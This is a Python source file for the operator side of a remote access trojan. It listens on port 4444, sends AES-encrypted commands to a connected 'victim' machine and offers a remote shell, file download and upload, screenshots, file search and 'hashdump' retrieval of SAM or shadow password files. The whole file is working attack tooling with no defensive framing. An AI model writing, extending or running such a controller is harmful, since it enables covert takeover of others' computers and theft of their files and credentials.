import socket
import threading
from base64 import b64encode, b64decode
from Crypto.Cipher import AES
import os

# AES encryption/decryption
BLOCK_SIZE = 16
KEY = b'ChdtkSnUtJ3yz8Uq3SJJ6TTZ'  # 24 bytes key (must be 16, 24, or 32 bytes long)

def pad(s):
    return s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)

def unpad(s):
    return s[:-ord(s[len(s)-1:])]

def encrypt(message):
    raw = pad(message).encode('utf-8')
    cipher = AES.new(KEY, AES.MODE_ECB)
    return b64encode(cipher.encrypt(raw)).decode('utf-8')

def decrypt(enc):
    enc = b64decode(enc)
    cipher = AES.new(KEY, AES.MODE_ECB)
    return unpad(cipher.decrypt(enc)).decode('utf-8')

def handle_client(conn):
    try:
        while True:
            command = input("Shell> ")
            if command.lower() == 'help':
                print("\nAvailable Commands:")
                print("help         : Show this help message")
                print("download     : Download files from the victim to the server")
                print("upload       : Upload files from the server to the victim")
                print("shell        : Open an interactive shell (bash or cmd)")
                print("ipconfig     : Get the network configuration of the victim machine")
                print("screenshot   : Take a screenshot of the victim machine")
                print("search       : Search for a file on the victim machine")
                print("hashdump     : Retrieve the SAM database or shadow file from the victim machine\n")
                continue
            if command.lower() == 'shell':
                while True:
                    shell_command = input("Shell (type 'exit' to return)> ")
                    if shell_command.lower() == 'exit':
                        break
                    if shell_command:
                        conn.send(encrypt(shell_command).encode('utf-8'))
                        data = conn.recv(4096).decode('utf-8')
                        if not data:
                            break
                        print(decrypt(data))
                continue
            if command.lower().startswith('download'):
                try:
                    file_path = command.split(' ', 1)[1]
                except IndexError:
                    print("Error: 'download' command requires a file path")
                    continue
                conn.send(encrypt(command).encode('utf-8'))
                try:
                    with open(file_path, 'wb') as f:
                        while True:
                            data = conn.recv(4096).decode('utf-8')
                            if decrypt(data) == 'EOF':
                                break
                            f.write(b64decode(decrypt(data)))
                    print(f"File {file_path} downloaded successfully.")
                except Exception as e:
                    print(f"Failed to download {file_path}: {e}")
                continue
            if command.lower().startswith('upload'):
                try:
                    file_path = command.split(' ', 1)[1]
                except IndexError:
                    print("Error: 'upload' command requires a file path")
                    continue
                conn.send(encrypt(command).encode('utf-8'))
                try:
                    with open(file_path, 'rb') as f:
                        while True:
                            chunk = f.read(4096)
                            if not chunk:
                                break
                            conn.send(encrypt(b64encode(chunk).decode('utf-8')).encode('utf-8'))
                    conn.send(encrypt('EOF').encode('utf-8'))
                    print(f"File {file_path} uploaded successfully.")
                except Exception as e:
                    print(f"Failed to upload {file_path}: {e}")
                    conn.send(encrypt('ERROR').encode('utf-8'))
                continue
            conn.send(encrypt(command).encode('utf-8'))
            data = conn.recv(4096).decode('utf-8')
            if not data:
                break
            print(decrypt(data))
    finally:
        conn.close()

def server(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    print(f"Listening on {host}:{port}...")
    conn, addr = s.accept()
    print(f"Connection from {addr}")
    handle_client(conn)

if __name__ == '__main__':
    server('0.0.0.0', 4444)
